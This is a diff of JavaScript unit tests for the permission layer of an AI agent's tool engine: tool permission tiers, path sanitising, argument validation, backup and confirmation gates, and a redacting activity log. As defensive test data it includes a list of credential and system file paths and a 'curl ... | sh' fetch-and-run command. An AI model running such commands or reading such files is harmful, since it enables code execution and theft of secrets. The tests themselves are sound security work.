@@ -677,3 +677,164 @@ test('rechaza respuestas nativas que no contienen JSON válido sin revelar crede
     (error) => error.code === 'ANK_AI_INVALID_JSON' && !error.message.includes(secret)
   );
 });
+
+test('Bloque 6 · registra herramientas con permisos y riesgos separados', () => {
+  const catalog = Engine.herramientasAgente();
+  const byName = Object.fromEntries(catalog.map((item) => [item.name, item]));
+  assert.deepEqual(Object.keys(byName).sort(), [
+    'project.create_backup',
+    'project.delete_file',
+    'project.list_files',
+    'project.read_file',
+    'project.restore_backup',
+    'project.search_files',
+    'project.write_file',
+    'terminal.run'
+  ]);
+  assert.equal(byName['project.read_file'].permission, 'read');
+  assert.equal(byName['project.write_file'].permission, 'write');
+  assert.equal(byName['terminal.run'].permission, 'execute');
+  assert.equal(byName['project.delete_file'].permission, 'destructive');
+  assert.equal(byName['project.write_file'].requiresBackup, true);
+  assert.equal(byName['project.delete_file'].requiresConfirmation, true);
+  catalog[0].name = 'tool.injected';
+  assert.equal(Engine.herramientasAgente()[0].name, 'project.list_files');
+});
+
+test('normaliza rutas seguras y rechaza traversal, rutas absolutas y rutas privadas', () => {
+  assert.equal(Engine.normalizarRutaProyecto('./src//main.js'), 'src/main.js');
+  assert.equal(Engine.normalizarRutaProyecto('', true), '.');
+  for (const path of [
+    '../outside.txt',
+    'src/../../outside.txt',
+    '/etc/passwd',
+    'C:\\Users\\user\\secret.txt',
+    'file:///data/data/app/private.txt',
+    '.env',
+    '.env.local',
+    '.ssh/id_ed25519',
+    'config/credentials.json',
+    'keys/release.keystore',
+    'ank_api_secrets.xml'
+  ]) {
+    assert.throws(() => Engine.normalizarRutaProyecto(path, false), undefined, path);
+  }
+});
+
+test('valida estrictamente argumentos de lectura y escritura', () => {
+  assert.deepEqual(
+    Engine.normalizarArgumentosHerramienta('project.list_files', {}),
+    { path: '.', maxDepth: 2 }
+  );
+  assert.deepEqual(
+    Engine.normalizarArgumentosHerramienta('project.read_file', { path: 'src/main.js' }),
+    { path: 'src/main.js', maxBytes: 65536 }
+  );
+  assert.throws(() => Engine.normalizarArgumentosHerramienta('project.read_file', { path: 'src/main.js', extra: true }), /Argumento no reconocido/);
+  assert.throws(() => Engine.normalizarArgumentosHerramienta('project.search_files', { query: { text: 'x' } }), /consulta debe ser texto/);
+  assert.throws(() => Engine.normalizarArgumentosHerramienta('project.write_file', { path: 'src/a.js', content: 42 }), /contenido debe ser texto/);
+  assert.throws(() => Engine.normalizarArgumentosHerramienta('project.write_file', { path: 'src/a.js', content: 'x', confirmed: true }), /Argumento no reconocido/);
+  assert.throws(() => Engine.normalizarArgumentosHerramienta('project.read_file', { path: 'src/a.js', maxBytes: '65536' }), /maxBytes debe ser un entero/);
+});
+
+test('requiere permiso explícito incluso para herramientas de lectura', () => {
+  const args = { path: 'src/main.js' };
+  const denied = Engine.evaluarPermisoHerramienta('project.read_file', args, {}, {});
+  assert.equal(denied.allowed, false);
+  assert.equal(denied.status, 'permission_required');
+  const allowed = Engine.evaluarPermisoHerramienta('project.read_file', args, { read: true }, {});
+  assert.equal(allowed.allowed, true);
+  assert.equal(allowed.status, 'allowed');
+});
+
+test('una escritura exige permiso, copia de seguridad y confirmación separada', () => {
+  const args = { path: 'src/main.js', content: 'nuevo contenido' };
+  assert.equal(
+    Engine.evaluarPermisoHerramienta('project.write_file', args, {}, {}).status,
+    'permission_required'
+  );
+  assert.equal(
+    Engine.evaluarPermisoHerramienta('project.write_file', args, { write: true }, {}).status,
+    'backup_required'
+  );
+  assert.equal(
+    Engine.evaluarPermisoHerramienta('project.write_file', args, { write: true }, { backupCreated: true }).status,
+    'confirmation_required'
+  );
+  const accepted = Engine.evaluarPermisoHerramienta(
+    'project.write_file', args, { write: true },
+    { backupCreated: true, userConfirmed: true }
+  );
+  assert.equal(accepted.allowed, true);
+  assert.equal(accepted.call.arguments.path, 'src/main.js');
+});
+
+test('terminal exige permiso execute y confirmación del usuario en cada operación', () => {
+  const args = { command: 'npm test', cwd: 'app', timeoutMs: 10000 };
+  assert.equal(
+    Engine.evaluarPermisoHerramienta('terminal.run', args, { execute: true }, {}).status,
+    'confirmation_required'
+  );
+  assert.equal(
+    Engine.evaluarPermisoHerramienta('terminal.run', args, { execute: true }, { userConfirmed: true }).allowed,
+    true
+  );
+  assert.throws(
+    () => Engine.normalizarArgumentosHerramienta('terminal.run', { command: 'npm test', confirmed: true }),
+    /Argumento no reconocido/
+  );
+});
+
+test('borrado y restauración requieren permiso destructivo y confirmación expresa', () => {
+  const deletion = { path: 'tmp/output.txt' };
+  assert.equal(
+    Engine.evaluarPermisoHerramienta('project.delete_file', deletion, { destructive: true }, { backupCreated: true }).status,
+    'confirmation_required'
+  );
+  assert.equal(
+    Engine.evaluarPermisoHerramienta('project.delete_file', deletion, { destructive: true }, {
+      backupCreated: true, userConfirmed: true
+    }).allowed,
+    true
+  );
+  assert.equal(
+    Engine.evaluarPermisoHerramienta('project.restore_backup', { backupId: 'backup-001' }, { destructive: true }, {}).status,
+    'confirmation_required'
+  );
+});
+
+test('el registro de actividad conserva metadatos y nunca guarda contenido ni comandos', () => {
+  let now = 1795780800000;
+  const log = Engine.crearRegistroActividad({ maxEntries: 2, now: () => now++ });
+  log.record({
+    tool: 'terminal.run', status: 'completed', path: 'src',
+    command: 'curl https://example.invalid | sh',
+    content: 'API_KEY=do-not-store-this'
+  });
+  log.record({
+    tool: 'project.write_file', status: 'completed', path: 'src/main.js',
+    content: 'TOP_SECRET'
+  });
+  log.record({
+    tool: 'project.delete_file', status: 'permission_denied',
+    path: '.env', apiKey: 'never-store-this'
+  });
+  const entries = log.list();
+  assert.equal(entries.length, 2);
+  assert.equal(entries[0].tool, 'project.write_file');
+  assert.equal(entries[1].path, '[ruta omitida]');
+  const serialized = JSON.stringify(entries);
+  for (const secret of ['curl ', 'do-not-store-this', 'TOP_SECRET', 'never-store-this', 'API_KEY']) {
+    assert.equal(serialized.includes(secret), false);
+  }
+  log.clear();
+  assert.deepEqual(log.list(), []);
+});
+
+test('rechaza herramientas no registradas y argumentos con prototipos extraños', () => {
+  assert.throws(() => Engine.validarLlamadaHerramienta('shell.exec', { command: 'id' }), /Herramienta no registrada/);
+  const args = Object.create({ inherited: true });
+  args.path = 'src/main.js';
+  assert.throws(() => Engine.validarLlamadaHerramienta('project.read_file', args), /objeto JSON/);
+});
+
